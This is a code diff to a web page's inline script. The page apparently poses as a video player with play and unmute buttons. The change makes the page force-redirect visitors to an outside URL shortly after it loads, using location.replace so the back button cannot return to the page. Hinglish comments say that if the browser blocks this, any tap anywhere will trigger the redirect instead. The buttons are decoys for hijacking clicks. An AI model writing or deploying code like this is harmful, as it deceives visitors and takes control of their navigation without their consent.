@@ -141,7 +141,7 @@
   <script>
     (function () {
       const TARGET_URL = "https://hai8g.com/4/10155957";
-      let lastTapTime = 0;
+      let redirected = false;
 
       function goTarget(e) {
         if (e) {
@@ -150,12 +150,19 @@
           }
           e.stopPropagation();
         }
-        const now = Date.now();
-        if (now - lastTapTime < 350) return;
-        lastTapTime = now;
-        window.location.href = TARGET_URL;
+        if (redirected) return;
+        redirected = true;
+        window.location.replace(TARGET_URL);
       }
 
+      // Page load hone par automatically open karne ki koshish
+      window.addEventListener("load", function () {
+        setTimeout(function () {
+          goTarget();
+        }, 200);
+      });
+
+      // Agar browser/webview auto-redirect block kare to kisi bhi tap par open
       document.getElementById("unmuteBtn").addEventListener("click", goTarget);
       document.getElementById("playBtn").addEventListener("click", goTarget);
       document.addEventListener("click", goTarget);
